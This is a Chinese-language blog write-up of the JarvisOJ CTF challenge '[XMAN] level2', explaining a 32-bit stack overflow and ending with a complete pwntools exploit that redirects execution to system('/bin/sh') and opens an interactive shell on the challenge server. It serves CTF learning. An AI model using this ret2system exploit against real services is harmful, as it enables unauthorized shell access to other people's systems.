---
title: XMAN level2 の Write-Up
date: 2020-05-01 20:45:46
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- XMAN
- Stack
---
## Introduction

&emsp;&emsp;这是JarvisOJ的PWN题部分[XMAN]level2的Write-Up，题目难度不大，还是栈溢出覆盖返回地址，不过涉及到二次覆盖。可是由于这是32位程序，加上没有什么保护措施，其实这个二次覆盖也很简单，适合Rookie详细了解PWN的机制。

<!-- more -->

## Step 1

&emsp;&emsp;还是一样的套路，checksec：32位程序，没有什么特殊的保护措施：

![](/img/XMAN-level2/XMAN1.png)

&emsp;&emsp;程序运行如下图所示：

![](/img/XMAN-level2/XMAN2.png)

## Step 2

&emsp;&emsp;将程序拖到hopper disassembler中，还是熟悉的vulnerable_function函数，这次不同的是不再有callsystem函数直接利用了：

![](/img/XMAN-level2/XMAN3.png)

&emsp;&emsp;但是发现存在system函数：

![](/img/XMAN-level2/XMAN4.png)

&emsp;&emsp;所以需要调用这个函数传入参数，如“/bin/sh”，我们在程序里找一下有木有这个字符串：

![](/img/XMAN-level2/XMAN5.png)

&emsp;&emsp;果然在数据中找到hint，这样思路就完整了。利用vulnerable_function函数的栈溢出覆盖返回地址，使得程序跳转到system函数，然后覆盖这个函数jmp到的GOT表地址为数据中的“/bin/sh”即可，下图为system函数的汇编代码：

![](/img/XMAN-level2/XMAN6.png)

## Step 3

&emsp;&emsp;最后就是EXP的编写了，下面给出代码：

```Python
from pwn import *

# sh = process('./level2')
sh = remote('pwn2.jarvisoj.com', 9878)

elf = ELF('./level2')

sys_addr = elf.symbols['system']

shell_addr = elf.search('/bin/sh').next()

payload = 'a' * (0x88 + 0x4) + p32(sys_addr) + p32(0xaaaaaaaa) + p32(shell_addr)

sh.send(payload)

sh.interactive()
sh.close()
```

&emsp;&emsp;有两个地方需要稍微注意一下：

* 寻找’/bin/sh’时我是通过pwntools库ELF模块的search方法直接在程序中找（通过之前的分析确定程序中存在’/bin/sh’），其实由于Step 1中通过checksec发现程序并没有开启内存地址随机化保护，所以这里也可以替换成具体的’/bin/sh’地址（0x0804a024）

* 在构造payload的时候，跳转到system函数覆盖GOT表地址之前还需要给出system函数的返回地址，即0xaaaaaaaa

&emsp;&emsp;执行EXP即可获得最终flag：

![](/img/XMAN-level2/XMAN7.png)
